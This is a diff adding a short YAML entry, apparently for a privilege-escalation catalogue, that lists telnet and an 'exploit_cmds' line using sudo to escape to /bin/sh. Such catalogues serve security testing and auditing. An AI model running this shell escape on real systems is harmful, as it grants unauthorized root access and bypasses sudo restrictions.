@@ -1,0 +1,4 @@
+name: telnet
+binary_path: /usr/bin/telnet
+exploit_cmds:
+- sudo /usr/bin/telnet && !/bin/sh
